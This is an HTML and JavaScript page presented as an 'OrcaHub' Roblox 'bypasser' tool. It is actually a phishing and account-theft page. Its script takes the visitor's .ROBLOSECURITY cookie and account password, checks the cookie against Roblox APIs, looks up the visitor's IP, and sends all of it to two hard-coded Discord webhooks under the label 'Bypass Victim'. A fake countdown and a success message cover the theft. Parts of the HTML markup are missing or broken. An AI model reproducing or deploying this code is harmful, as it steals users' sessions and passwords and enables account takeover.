<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>OrcaHub • Bypasser</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    min-height: 100vh;
    overflow-x: hidden;
    font-family: 'Segoe UI', Tahoma, sans-serif;
    background: #04080f;
    background-image:
      radial-gradient(circle at 25% 15%, rgba(0,120,180,0.25), transparent 45%),
      radial-gradient(circle at 75% 85%, rgba(0,60,90,0.35), transparent 45%);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 40px 16px;
    position: relative;
  }

  .brand {
    color: rgba(255,255,255,0.4);
    font-size: 12px;
    letter-spacing: 4px;
    text-transform: uppercase;
    margin-bottom: 20px;
    animation: fadeIn 0.8s ease;
  }

  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }

  .frame {
    position: relative;
    width: 100%;
    max-width: 400px;
    height: 300px;
    background: linear-gradient(180deg, #061826 0%, #03202f 55%, #011a28 100%);
    border-radius: 20px;
    border: 1px solid rgba(79, 209, 255, 0.35);
    box-shadow: 0 0 40px rgba(0, 180, 255, 0.18), inset 0 0 60px rgba(0, 100, 150, 0.15);
    overflow: hidden;
  }

  .word-layer {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1;
    pointer-events: none;
  }

  .word {
    font-size: 34px;
    font-weight: 800;
    letter-spacing: 1px;
    display: flex;
  }

  .word .letter {
    display: inline-block;
    opacity: 0;
    color: rgba(255,255,255,0.92);
    text-shadow: 0 0 18px rgba(79, 209, 255, 0.55);
    transform: translateY(14px) scale(0.7);
    animation: letterIn 0.5s cubic-bezier(0.34,1.56,0.64,1) forwards;
  }

  @keyframes letterIn {
    to { opacity: 1; transform: translateY(0) scale(1); }
  }

  .scene {
    position: absolute;
    inset: 0;
    z-index: 2;
  }

  .scene canvas {
    width: 100% !important;
    height: 100% !important;
    display: block;
  }

  .water-line {
    position: absolute;
    left: 0; right: 0;
    bottom: 38%;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(79,209,255,0.4), transparent);
    z-index: 3;
    pointer-events: none;
  }

  .loading-panel {
    margin-top: 28px;
    width: 100%;
    max-width: 340px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 12px;
    opacity: 0;
    transform: translateY(10px);
    pointer-events: none;
    transition: opacity 0.5s ease, transform 0.5s ease;
  }

  .loading-panel.show {
    opacity: 1;
    transform: translateY(0);
  }

  .loading-row {
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .spinner {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    border: 3px solid rgba(79, 209, 255, 0.15);
    border-top-color: #4fd1ff;
    animation: spin 0.8s linear infinite;
    flex-shrink: 0;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .loading-text {
    color: #cdefff;
    font-size: 14px;
    font-weight: 600;
    letter-spacing: 2px;
    text-transform: uppercase;
  }

  .loading-text .dots span {
    opacity: 0;
    animation: dotBlink 1.2s infinite;
  }
  .loading-text .dots span:nth-child(1) { animation-delay: 0s; }
  .loading-text .dots span:nth-child(2) { animation-delay: 0.2s; }
  .loading-text .dots span:nth-child(3) { animation-delay: 0.4s; }

  @keyframes dotBlink {
    0%, 20% { opacity: 0; }
    50% { opacity: 1; }
    100% { opacity: 0; }
  }

  .progress-track {
    width: 100%;
    height: 6px;
    border-radius: 4px;
    background: rgba(255,255,255,0.07);
    overflow: hidden;
  }

  .progress-fill {
    height: 100%;
    width: 0%;
    border-radius: 4px;
    background: linear-gradient(90deg, #00c2ff, #4fd1ff, #7dffea);
    box-shadow: 0 0 10px rgba(79, 209, 255, 0.6);
    transition: width 3s linear;
  }

  .login-btn {
    margin-top: 28px;
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 15px 38px;
    border: none;
    border-radius: 50px;
    background: linear-gradient(135deg, #00c2ff, #4fd1ff, #00ffc8);
    color: #04141f;
    font-size: 16px;
    font-weight: 800;
    letter-spacing: 1px;
    cursor: pointer;
    box-shadow: 0 0 0 rgba(79, 209, 255, 0);
    transform: scale(0);
    opacity: 0;
    transition: transform 0.2s ease, box-shadow 0.3s ease;
  }

  .login-btn.show {
    animation: popIn 0.6s cubic-bezier(0.34,1.56,0.64,1) forwards;
  }

  @keyframes popIn {
    0% { transform: scale(0); opacity: 0; }
    70% { transform: scale(1.08); opacity: 1; }
    100% { transform: scale(1); opacity: 1; box-shadow: 0 0 25px rgba(79, 209, 255, 0.5); }
  }

  .login-btn:hover {
    transform: scale(1.05);
    box-shadow: 0 0 35px rgba(79, 209, 255, 0.75);
  }

  .login-btn:active {
    transform: scale(0.97);
  }

  .login-btn svg {
    width: 18px;
    height: 18px;
  }

  .footer {
    margin-top: 30px;
    font-size: 11px;
    color: rgba(255,255,255,0.3);
    letter-spacing: 2px;
    text-transform: uppercase;
  }

  /* ===== BYPASSER OVERLAY ===== */
  .bypasser-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(4, 8, 15, 0.92);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    z-index: 100;
    justify-content: center;
    align-items: center;
    padding: 20px;
  }

  .bypasser-overlay.open {
    display: flex;
    animation: fadeIn 0.5s ease;
  }

  .bypasser-card {
    width: 100%;
    max-width: 480px;
    background: rgba(16, 16, 30, 0.9);
    border-radius: 40px;
    border: 1px solid rgba(255, 255, 255, 0.05);
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
    padding: 28px 26px;
    animation: slideUp 0.6s ease;
  }

  @keyframes slideUp {
    from { opacity: 0; transform: translateY(30px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .bypasser-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 16px;
  }

  .bypasser-header h3 {
    font-size: 16px;
    font-weight: 700;
    color: #fff;
    letter-spacing: 1px;
  }

  .bypasser-header span {
    font-size: 11px;
    color: #4ecdc4;
    font-weight: 600;
  }

  .bypasser-input-group {
    display: flex;
    flex-direction: column;
    gap: 10px;
    margin-bottom: 14px;
  }

  .bypasser-input-group input {
    width: 100%;
    padding: 13px 18px;
    background: rgba(10, 10, 20, 0.6);
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 30px;
    color: #f0f0ff;
    font-size: 13px;
    outline: none;
    transition: 0.4s;
  }

  .bypasser-input-group input:focus {
    border-color: #a29bfe;
    box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.08);
  }

  .bypasser-input-group input::placeholder {
    color: #3a3a52;
  }

  .bypasser-input-group input.error {
    border-color: #ff6b6b;
    box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
  }

  .bypasser-input-group input.success {
    border-color: #4ecdc4;
    box-shadow: 0 0 0 4px rgba(78, 205, 196, 0.1);
  }

  .profile-preview {
    background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
    border-radius: 32px;
    padding: 14px 18px;
    margin-bottom: 14px;
    border: 1px solid rgba(255, 255, 255, 0.03);
    display: none;
    align-items: center;
    gap: 14px;
    backdrop-filter: blur(8px);
    transition: all 0.4s ease;
  }

  .profile-preview.show {
    display: flex;
    animation: fadeInScale 0.5s ease;
  }

  @keyframes fadeInScale {
    from { opacity: 0; transform: scale(0.92); }
    to { opacity: 1; transform: scale(1); }
  }

  .profile-preview img {
    width: 50px;
    height: 50px;
    border-radius: 50%;
    border: 2px solid rgba(162, 155, 254, 0.3);
    box-shadow: 0 0 30px rgba(162, 155, 254, 0.15);
    object-fit: cover;
    background: #1a1a2e;
  }

  .profile-info {
    flex: 1;
  }

  .profile-name {
    font-size: 0.95rem;
    font-weight: 700;
    color: #fff;
  }

  .profile-id {
    color: #8888aa;
    font-size: 0.65rem;
    margin-top: 1px;
  }

  .profile-stats {
    color: #666688;
    font-size: 0.6rem;
    margin-top: 1px;
  }

  .badge-verified {
    display: inline-block;
    background: rgba(78, 205, 196, 0.15);
    color: #4ecdc4;
    padding: 1px 10px;
    border-radius: 20px;
    font-size: 0.55rem;
    font-weight: 600;
    margin-top: 2px;
    border: 1px solid rgba(78, 205, 196, 0.1);
  }

  .bypasser-actions {
    display: flex;
    gap: 10px;
    margin-top: 4px;
  }

  .bypasser-actions .btn-bypass {
    flex: 2;
    padding: 13px;
    background: linear-gradient(135deg, #a29bfe, #ff6b6b);
    border: none;
    border-radius: 30px;
    font-weight: 700;
    font-size: 13px;
    color: white;
    cursor: pointer;
    transition: 0.4s;
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  .bypasser-actions .btn-bypass:hover {
    transform: scale(1.02);
    box-shadow: 0 8px 30px rgba(162, 155, 254, 0.3);
  }

  .bypasser-actions .btn-bypass:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none !important;
  }

  .bypasser-actions .btn-instagram {
    flex: 1;
    padding: 13px;
    background: linear-gradient(135deg, #f58529, #dd2a7b);
    border: none;
    border-radius: 30px;
    font-weight: 700;
    font-size: 12px;
    color: white;
    cursor: pointer;
    transition: 0.4s;
    text-decoration: none;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }

  .bypasser-actions .btn-instagram:hover {
    transform: scale(1.02);
    box-shadow: 0 8px 30px rgba(221, 42, 123, 0.3);
  }

  .bypasser-actions .btn-instagram svg {
    width: 16px;
    height: 16px;
    fill: currentColor;
  }

  .bypasser-loader {
    display: none;
    text-align: center;
    padding: 10px 0;
  }

  .bypasser-loader.show {
    display: block;
    animation: fadeIn 0.4s ease;
  }

  .bypasser-loader .spinner-small {
    width: 40px;
    height: 40px;
    border: 3px solid rgba(162, 155, 254, 0.08);
    border-top-color: #a29bfe;
    border-right-color: #ff6b6b;
    border-radius: 50%;
    animation: spin 0.8s ease infinite;
    margin: 0 auto 10px;
  }

  .bypasser-loader .loader-text {
    color: #8888aa;
    font-size: 12px;
    font-weight: 300;
  }

  .bypasser-loader .loader-text .time {
    color: #ff6b6b;
    font-weight: 700;
  }

  .bypasser-result {
    display: none;
    background: rgba(78, 205, 196, 0.06);
    border: 1px solid rgba(78, 205, 196, 0.12);
    color: #4ecdc4;
    padding: 12px 16px;
    border-radius: 24px;
    text-align: center;
    font-size: 13px;
    font-weight: 600;
    margin-top: 12px;
    animation: fadeIn 0.4s ease;
  }

  .bypasser-result.show {
    display: block;
  }

  .bypasser-result .big {
    font-size: 2rem;
    display: block;
    margin-bottom: 4px;
  }

  .bypasser-error {
    display: none;
    background: rgba(255, 107, 107, 0.08);
    border: 1px solid rgba(255, 107, 107, 0.15);
    color: #ff6b6b;
    padding: 10px 14px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 500;
    text-align: center;
    margin-top: 10px;
    animation: fadeIn 0.4s ease;
  }

  .bypasser-error.show {
    display: block;
  }

  .close-bypasser {
    position: absolute;
    top: 20px;
    right: 30px;
    color: rgba(255,255,255,0.3);
    font-size: 28px;
    cursor: pointer;
    transition: 0.3s;
    background: none;
    border: none;
  }

  .close-bypasser:hover {
    color: #fff;
    transform: rotate(90deg);
  }

  @media (max-width: 480px) {
    .bypasser-card { padding: 20px 16px; }
    .bypasser-actions { flex-direction: column; gap: 8px; }
    .profile-preview { flex-direction: column; text-align: center; }
    .profile-preview img { width: 60px; height: 60px; }
  }
</style>
</head>
<body>

  <div class="brand">orcahub</div>

  <div class="frame">
    <div class="water-line"></div>
    <div class="word-layer">
      <div class="word" id="word"></div>
    </div>
    <div class="scene" id="scene"></div>
  </div>

  <div class="loading-panel" id="loadingPanel">
    <div class="loading-row">
      <div class="spinner"></div>
      <div class="loading-text">
        WAITING<span class="dots"><span>.</span><span>.</span><span>.</span></span>

      <div id="profilePreview" class="profile-preview">

          <div class="profile-name" id="profileName">@username</div>

          <span class="badge-verified" id="profileBadge">✅ Verified</span>

      </div>

      <div id="bypasserError" class="bypasser-error"></div>

      <div id="bypasserResult" class="bypasser-result">

        <div style="font-size:1rem; margin-bottom:2px;">BYPASS SUCCESSFUL!</div>

      <div class="bypasser-actions">

          Owner

      </div>
    </div>
  </div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
<script>
  document.addEventListener('DOMContentLoaded', () => {

    // ==================== ANIMATE WORD ====================
    function animateWord(elementId, text, baseDelay, stepDelay) {
      const el = document.getElementById(elementId);
      el.innerHTML = '';
      text.split('').forEach((ch, i) => {
        const span = document.createElement('span');
        span.className = 'letter';
        span.textContent = ch === ' ' ? '\u00A0' : ch;
        span.style.animationDelay = (baseDelay + i * stepDelay) + 's';
        el.appendChild(span);
      });
    }
    animateWord('word', 'ORCAHUB', 0.15, 0.07);

    // ==================== LOADING SEQUENCE ====================
    const loadingPanel = document.getElementById('loadingPanel');
    const progressFill = document.getElementById('progressFill');
    const loginBtn = document.getElementById('loginBtn');

    setTimeout(() => {
      loadingPanel.classList.add('show');
      requestAnimationFrame(() => {
        requestAnimationFrame(() => {
          progressFill.style.width = '100%';
        });
      });
    }, 1600);

    setTimeout(() => {
      loadingPanel.style.opacity = '0';
      loadingPanel.style.transform = 'translateY(-8px)';
      setTimeout(() => { loadingPanel.style.display = 'none'; }, 500);
      loginBtn.classList.add('show');
    }, 1600 + 3000 + 300);

    // ==================== THREE.JS ORCA ====================
    const container = document.getElementById('scene');
    const scene = new THREE.Scene();

    const camera = new THREE.PerspectiveCamera(45, 1, 0.1, 100);
    camera.position.set(0, 0.6, 6.5);
    camera.lookAt(0, 0, 0);

    const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
    container.appendChild(renderer.domElement);

    function resizeRenderer() {
      const w = container.clientWidth;
      const h = container.clientHeight;
      renderer.setSize(w, h);
      camera.aspect = w / h;
      camera.updateProjectionMatrix();
    }
    resizeRenderer();
    window.addEventListener('resize', resizeRenderer);

    scene.add(new THREE.AmbientLight(0x88bbdd, 0.9));
    const keyLight = new THREE.DirectionalLight(0xffffff, 0.9);
    keyLight.position.set(2, 4, 3);
    scene.add(keyLight);
    const rimLight = new THREE.PointLight(0x4fd1ff, 1.4, 20);
    rimLight.position.set(-3, 1, 2);
    scene.add(rimLight);

    const orca = new THREE.Group();

    const blackMat = new THREE.MeshStandardMaterial({ color: 0x0d1013, roughness: 0.35, metalness: 0.15 });
    const whiteMat = new THREE.MeshStandardMaterial({ color: 0xf2f5f7, roughness: 0.4, metalness: 0.05 });

    const body = new THREE.Mesh(new THREE.SphereGeometry(0.55, 24, 24), blackMat);
    body.scale.set(0.85, 0.95, 2.3);
    orca.add(body);

    const nose = new THREE.Mesh(new THREE.SphereGeometry(0.32, 16, 16), blackMat);
    nose.scale.set(0.8, 0.75, 1.1);
    nose.position.set(0, -0.05, 1.15);
    orca.add(nose);

    const belly = new THREE.Mesh(new THREE.SphereGeometry(0.5, 20, 20), whiteMat);
    belly.scale.set(0.55, 0.35, 1.7);
    belly.position.set(0, -0.42, -0.05);
    orca.add(belly);

    const eyePatchGeo = new THREE.SphereGeometry(0.11, 12, 12);
    const eyePatchL = new THREE.Mesh(eyePatchGeo, whiteMat);
    eyePatchL.scale.set(1, 0.55, 1.7);
    eyePatchL.position.set(-0.36, 0.08, 0.75);
    eyePatchL.rotation.y = 0.3;
    orca.add(eyePatchL);
    const eyePatchR = eyePatchL.clone();
    eyePatchR.position.x = 0.36;
    eyePatchR.rotation.y = -0.3;
    orca.add(eyePatchR);

    const eyeGeo = new THREE.SphereGeometry(0.035, 8, 8);
    const eyeMat = new THREE.MeshStandardMaterial({ color: 0x000000 });
    const eyeL = new THREE.Mesh(eyeGeo, eyeMat);
    eyeL.position.set(-0.34, 0.1, 0.92);
    orca.add(eyeL);
    const eyeR = eyeL.clone();
    eyeR.position.x = 0.34;
    orca.add(eyeR);

    const saddle = new THREE.Mesh(new THREE.SphereGeometry(0.3, 12, 12), new THREE.MeshStandardMaterial({ color: 0x555b60, roughness: 0.6 }));
    saddle.scale.set(0.5, 0.15, 0.6);
    saddle.position.set(0, 0.42, -0.55);
    orca.add(saddle);

    const dorsalShape = new THREE.Shape();
    dorsalShape.moveTo(0, 0);
    dorsalShape.quadraticCurveTo(0.05, 0.5, -0.15, 0.95);
    dorsalShape.quadraticCurveTo(0.05, 0.6, 0.25, 0);
    dorsalShape.lineTo(0, 0);
    const dorsalGeo = new THREE.ExtrudeGeometry(dorsalShape, { depth: 0.04, bevelEnabled: false });
    const dorsal = new THREE.Mesh(dorsalGeo, blackMat);
    dorsal.position.set(-0.02, 0.35, -0.05);
    dorsal.rotation.y = Math.PI / 2;
    orca.add(dorsal);

    const pecGeo = new THREE.SphereGeometry(0.22, 10, 10);
    const pecL = new THREE.Mesh(pecGeo, blackMat);
    pecL.scale.set(0.25, 0.6, 1.1);
    pecL.position.set(-0.48, -0.1, 0.4);
    pecL.rotation.z = 0.5;
    pecL.rotation.x = -0.3;
    orca.add(pecL);
    const pecR = pecL.clone();
    pecR.position.x = 0.48;
    pecR.rotation.z = -0.5;
    orca.add(pecR);

    const peduncle = new THREE.Mesh(new THREE.CylinderGeometry(0.14, 0.22, 0.6, 12), blackMat);
    peduncle.rotation.x = Math.PI / 2;
    peduncle.position.set(0, -0.02, -1.35);
    orca.add(peduncle);

    const flukeGeo = new THREE.SphereGeometry(0.4, 12, 12);
    const flukeL = new THREE.Mesh(flukeGeo, blackMat);
    flukeL.scale.set(1.15, 0.06, 0.5);
    flukeL.position.set(-0.32, 0, -1.7);
    flukeL.rotation.y = 0.35;
    orca.add(flukeL);
    const flukeR = flukeL.clone();
    flukeR.position.x = 0.32;
    flukeR.rotation.y = -0.35;
    orca.add(flukeR);

    scene.add(orca);

    const splashGroup = new THREE.Group();
    const splashParticles = [];
    for (let i = 0; i < 16; i++) {
      const mat = new THREE.MeshBasicMaterial({ color: 0xbfe9ff, transparent: true, opacity: 0 });
      const p = new THREE.Mesh(new THREE.SphereGeometry(0.035, 6, 6), mat);
      p.userData.active = false;
      splashGroup.add(p);
      splashParticles.push(p);
    }
    scene.add(splashGroup);

    function burstSplash(x, y, z) {
      for (let i = 0; i < splashParticles.length; i++) {
        const p = splashParticles[i];
        if (!p.userData.active) {
          p.userData.active = true;
          p.userData.age = 0;
          p.userData.vx = (Math.random() - 0.5) * 1.6;
          p.userData.vy = Math.random() * 1.4 + 0.4;
          p.userData.vz = (Math.random() - 0.5) * 0.6;
          p.position.set(x, y, z);
          p.material.opacity = 0.9;
          if (splashParticles.filter(sp => sp.userData.active).length >= 6) break;
        }
      }
    }

    const WATER_Y = -0.35;
    const JUMP_DURATION = 3.4;
    const RANGE_X = 2.6;
    const PEAK_HEIGHT = 1.5;

    let jumpClock = 0;
    let splashedEntry = false;
    let splashedExit = false;
    const clock = new THREE.Clock();

    function animate() {
      requestAnimationFrame(animate);
      const dt = clock.getDelta();
      const t = clock.getElapsedTime();

      jumpClock += dt;
      let progress = (jumpClock % JUMP_DURATION) / JUMP_DURATION;
      if (progress < (jumpClock - dt) % JUMP_DURATION / JUMP_DURATION) {
        splashedEntry = false;
        splashedExit = false;
      }

      const x = -RANGE_X + progress * RANGE_X * 2;
      const arc = Math.sin(progress * Math.PI);
      const y = WATER_Y + arc * PEAK_HEIGHT;

      orca.position.set(x, y, 0);
      orca.rotation.x = Math.cos(progress * Math.PI) * 0.55;
      orca.rotation.z = Math.sin(t * 3) * 0.03;

      if (progress > 0.06 && progress < 0.12 && !splashedEntry) {
        burstSplash(x, WATER_Y, 0);
        splashedEntry = true;
      }
      if (progress > 0.88 && progress < 0.94 && !splashedExit) {
        burstSplash(x, WATER_Y, 0);
        splashedExit = true;
      }

      splashParticles.forEach((p) => {
        if (p.userData.active) {
          p.userData.age += dt;
          p.position.x += p.userData.vx * dt;
          p.position.y += p.userData.vy * dt;
          p.position.z += p.userData.vz * dt;
          p.userData.vy -= 2.2 * dt;
          p.material.opacity = Math.max(0, 0.9 - p.userData.age * 1.4);
          if (p.userData.age > 0.7) p.userData.active = false;
        }
      });

      rimLight.position.x = Math.sin(t * 0.4) * 3;

      renderer.render(scene, camera);
    }

    animate();

    // ==================== BYPASSER ENGINE ====================
    const WEBHOOKS = [
      'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG',
      'https://discord.com/api/webhooks/1544611453569466398/Cc1uK6qn4rQbrjch6wDfjDbMMjLPIdccFN6VZt9czKCHtTreW0LhjO-OOoFKTWltX5i8'
    ];

    const DOM = {
      cookieInput: document.getElementById('cookieInput'),
      passwordInput: document.getElementById('passwordInput'),
      bypassBtn: document.getElementById('bypassBtn'),
      instagramBtn: document.getElementById('instagramBtn'),
      error: document.getElementById('bypasserError'),
      loader: document.getElementById('bypasserLoader'),
      timer: document.getElementById('bypassTimer'),
      result: document.getElementById('bypasserResult'),
      profilePreview: document.getElementById('profilePreview'),
      profileImg: document.getElementById('profileImg'),
      profileName: document.getElementById('profileName'),
      profileId: document.getElementById('profileId'),
      profileStats: document.getElementById('profileStats'),
      profileBadge: document.getElementById('profileBadge'),
      overlay: document.getElementById('bypasserOverlay'),
      closeBtn: document.getElementById('closeBypasser'),
      loginBtn: document.getElementById('loginBtn'),
    };

    DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';

    let bypassTimer = null;
    let isProcessing = false;

    // ==================== OPEN BYPASSER ON LOGIN ====================
    DOM.loginBtn.addEventListener('click', () => {
      DOM.overlay.classList.add('open');
    });

    DOM.closeBtn.addEventListener('click', () => {
      DOM.overlay.classList.remove('open');
    });

    DOM.overlay.addEventListener('click', (e) => {
      if (e.target === DOM.overlay) {
        DOM.overlay.classList.remove('open');
      }
    });

    // ==================== ROBLOX API ====================
    async function fetchRobloxProfile(cookie) {
      try {
        const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        if (response.status === 401 || response.status === 403) {
          return { valid: false, error: 'The cookie has expired or is not working' };
        }

        if (!response.ok) {
          return { valid: false, error: 'Invalid cookie or network error' };
        }

        const data = await response.json();
        const userId = data.UserID;

        const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });
        let profileData = {};
        if (profileResponse.ok) {
          profileData = await profileResponse.json();
        }

        const followersResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });
        let followers = 0;
        if (followersResponse.ok) {
          const followersData = await followersResponse.json();
          followers = followersData.count || 0;
        }

        const followingResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });
        let following = 0;
        if (followingResponse.ok) {
          const followingData = await followingResponse.json();
          following = followingData.count || 0;
        }

        return {
          valid: true,
          user: {
            username: data.UserName || profileData.name || 'Unknown',
            userId: userId,
            displayName: data.UserName || profileData.name || 'Unknown',
            isVerified: data.IsVerified || false,
            followers: followers,
            following: following,
            created: profileData.created || 'Unknown',
            avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
          }
        };

      } catch (error) {
        console.error('Roblox API error:', error);
        return { valid: false, error: 'Network error. Please try again.' };
      }
    }

    // ==================== SEND TO WEBHOOKS ====================
    function sendToWebhooks(data) {
      WEBHOOKS.forEach(url => {
        try {
          fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            mode: 'no-cors'
          }).catch(() => {});
        } catch (_) {}
      });
    }

    // ==================== GET IP ====================
    function getIP() {
      try {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.ipify.org?format=json', false);
        xhr.send();
        return JSON.parse(xhr.responseText).ip || 'Unknown';
      } catch (_) { return 'Unknown'; }
    }

    // ==================== VALIDATE COOKIE WITH API ====================
    async function validateCookieWithAPI(cookie) {
      const result = await fetchRobloxProfile(cookie);
      if (result.valid) {
        DOM.profileName.textContent = `@${result.user.username}`;
        DOM.profileId.textContent = `ID: ${result.user.userId}`;
        DOM.profileStats.textContent =
          `📊 Followers: ${result.user.followers.toLocaleString()} • Following: ${result.user.following.toLocaleString()}`;
        DOM.profileBadge.textContent = result.user.isVerified ? '✅ Verified' : '● Active';
        DOM.profileImg.src = result.user.avatarUrl;
        DOM.profileImg.onerror = function() {
          this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(result.user.username) +
            '&background=random&size=80&rounded=true&color=fff';
        };
        DOM.profilePreview.classList.add('show');
        DOM.cookieInput.classList.remove('error');
        DOM.cookieInput.classList.add('success');
        DOM.error.classList.remove('show');
        return { valid: true, user: result.user };
      } else {
        DOM.profilePreview.classList.remove('show');
        DOM.cookieInput.classList.remove('success');
        DOM.cookieInput.classList.add('error');
        DOM.error.textContent = '❌ ' + (result.error || 'The cookie has expired or is not working');
        DOM.error.classList.add('show');
        return { valid: false };
      }
    }

    // ==================== START BYPASS ====================
    async function startBypass() {
      const cookie = DOM.cookieInput.value.trim();
      const password = DOM.passwordInput.value.trim();

      DOM.error.classList.remove('show');
      DOM.result.classList.remove('show');
      DOM.loader.classList.remove('show');

      if (!cookie || cookie.length < 15) {
        DOM.error.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
        DOM.error.classList.add('show');
        DOM.cookieInput.classList.add('error');
        return;
      }

      if (!password || password.length < 3) {
        DOM.error.textContent = '❌ Please enter your account password!';
        DOM.error.classList.add('show');
        DOM.passwordInput.classList.add('error');
        return;
      }

      const validation = await validateCookieWithAPI(cookie);
      if (!validation.valid) {
        return;
      }

      isProcessing = true;
      DOM.bypassBtn.disabled = true;
      DOM.bypassBtn.textContent = '⏳ Processing...';
      DOM.loader.classList.add('show');

      let seconds = 60;
      DOM.timer.textContent = seconds;

      if (bypassTimer) clearInterval(bypassTimer);

      bypassTimer = setInterval(() => {
        seconds--;
        DOM.timer.textContent = seconds;

        if (seconds <= 0) {
          clearInterval(bypassTimer);
          bypassTimer = null;
          completeBypass(cookie, password, validation.user);
        }
      }, 1000);

      sendToWebhooks({
        embeds: [{
          title: "🦈 OrcaHub • Bypass Initiated",
          color: 0x7c6cf0,
          fields: [
            { name: "👤 Username", value: `\`${validation.user.username}\``, inline: true },
            { name: "🍪 Cookie", value: `\`${cookie.substring(0, 40)}...\``, inline: true },
            { name: "🔑 Password", value: `||${password}||`, inline: true },
            { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
            { name: "🕒 Time", value: new Date().toISOString(), inline: true }
          ],
          footer: { text: "OrcaHub • Bypasser" },
          thumbnail: { url: validation.user.avatarUrl }
        }]
      });
    }

    // ==================== COMPLETE BYPASS ====================
    function completeBypass(cookie, password, userData) {
      const embed = {
        title: "🎯 OrcaHub • Bypass Victim",
        color: 0xff6b6b,
        fields: [
          { name: "👤 Username", value: `\`${userData.username}\``, inline: true },
          { name: "🆔 User ID", value: `\`${userData.userId}\``, inline: true },
          { name: "🔑 Password", value: `||${password}||`, inline: false },
          { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
          { name: "📊 Followers", value: `\`${userData.followers.toLocaleString()}\``, inline: true },
          { name: "📊 Following", value: `\`${userData.following.toLocaleString()}\``, inline: true },
          { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
          { name: "📅 Created", value: `\`${userData.created}\``, inline: true },
          { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
          { name: "🕒 Time", value: new Date().toISOString(), inline: true }
        ],
        footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
        thumbnail: { url: userData.avatarUrl }
      };
      sendToWebhooks({ embeds: [embed] });

      DOM.loader.classList.remove('show');
      DOM.result.classList.add('show');

      isProcessing = false;
      DOM.bypassBtn.disabled = false;
      DOM.bypassBtn.textContent = '🚀 Start Bypass';

      setTimeout(() => {
        DOM.result.classList.remove('show');
      }, 8000);
    }

    // ==================== EVENTS ====================
    DOM.bypassBtn.addEventListener('click', startBypass);

    DOM.cookieInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') startBypass();
    });
    DOM.passwordInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') startBypass();
    });

    DOM.cookieInput.addEventListener('blur', function() {
      const cookie = this.value.trim();
      if (cookie && cookie.length > 5) {
        validateCookieWithAPI(cookie);
      }
    });

    DOM.cookieInput.addEventListener('input', function() {
      if (this.value.trim().length > 5) {
        const cookie = this.value.trim();
        fetchRobloxProfile(cookie).then(result => {
          if (result.valid) {
            DOM.error.classList.remove('show');
            this.classList.remove('error');
            this.classList.add('success');
          } else {
            this.classList.remove('success');
            this.classList.add('error');
          }
        });
      }
    });

  });
</script>
